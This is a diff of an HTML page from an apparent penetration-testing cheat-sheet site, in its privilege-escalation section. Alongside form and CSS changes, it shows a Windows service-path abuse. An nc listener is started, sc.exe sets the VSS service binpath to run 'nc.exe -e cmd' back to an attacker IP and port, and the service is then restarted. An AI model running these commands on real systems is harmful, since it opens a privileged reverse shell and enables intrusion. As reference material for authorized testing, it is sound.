@@ -195,26 +195,150 @@
   <li><a href="https://tldrbins.github.io/@privesc/">Privesc</a></li>
   
 </ul>
+<hr>
+<div class="content">
+<div id="params">
+	<form id="params_form" style="display: none;">
+	</form>
+	<div class="center">
+		<button id="form_btn">Show Params Form</button>
+		<button id="replace_btn" style="display: none;">Replace Params</button>
+		<button id="reset_btn" style="display: none;">Reset</button>
+		<button id="clear_btn" style="display: none;">Clear Cache</button>
+	</div>
+</div>
 
-<div class="content"><hr>
+<style>
+#params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: white;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #aaa;
+	font-family: system-ui;
+}
+
+#params * {
+    box-sizing: border-box;
+}
+
+#params input {
+  margin-bottom: 15px;
+}
+
+#params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #f5f5f5;
+}
+
+#params label {
+	color: #333333;
+	font-size: 0.9rem;
+}
+
+#params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #f5f5f5;
+	font-weight: 700;
+	background: rgba(44, 82, 179);
+}
+
+#params button:hover {
+    cursor: pointer;
+    background: rgba(44, 82, 179, 0.95);
+}
+
+.center {
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
+
+ 
+body.dark-mode #params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: #23272a;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #23272a;
+	font-family: system-ui;
+}
+
+body.dark-mode #params * {
+    box-sizing: border-box;
+}
+
+body.dark-mode #params input {
+	border-radius: 0.2em;
+	border: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input:focus {
+	margin-bottom: 15px;
+	outline: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #bdbdbd;
+}
+
+body.dark-mode #params label {
+	color: #fafafa;
+	font-size: 0.9rem;
+}
+
+body.dark-mode #params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #fafafa;
+	font-weight: 700;
+	background: #616161;
+}
+
+body.dark-mode #params button:hover {
+    cursor: pointer;
+    background: #424242;
+}
+
+
+</style>
 <h4 id="abuse-1-modify-service-path">Abuse #1. Modify Service Path</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Start a nc listener</span>
-</span></span><span class="line"><span class="cl">rlwrap nc -lvnp <span class="m">443</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Start a nc listener
+</span></span><span class="line"><span class="cl"><span class="go">rlwrap nc -lvnp &lt;LOCAL_PORT&gt;
+</span></span></span></code></pre></div></div>
 <p>
 <button data-tabset="set1" data-tabcontent="tab1" class="active">Windows</button>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Assumed nc.exe is uploaded</span>
-</span></span><span class="line"><span class="cl"><span class="n">sc</span><span class="p">.</span><span class="py">exe</span> <span class="n">config</span> <span class="n">VSS</span> <span class="n">binpath</span><span class="p">=</span><span class="s2">&#34;C:\ProgramData\nc.exe -e cmd 10.10.14.10 443&#34;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Stop service</span>
-</span></span><span class="line"><span class="cl"><span class="n">sc</span><span class="p">.</span><span class="py">exe</span> <span class="n">stop</span> <span class="n">VSS</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Start service</span>
-</span></span><span class="line"><span class="cl"><span class="n">sc</span><span class="p">.</span><span class="py">exe</span> <span class="nb">start </span><span class="n">VSS</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Assumed nc.exe is uploaded
+</span></span><span class="line"><span class="cl"><span class="go">sc.exe config VSS binpath=&#34;C:\ProgramData\nc.exe -e cmd &lt;LOCAL_IP&gt; &lt;LOCAL_PORT&gt;&#34;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Stop service
+</span></span><span class="line"><span class="cl"><span class="go">sc.exe stop VSS
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Start service
+</span></span><span class="line"><span class="cl"><span class="go">sc.exe start VSS
+</span></span></span></code></pre></div></div>
 </div></p>
-<br></div></div>
+<br>
+</div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
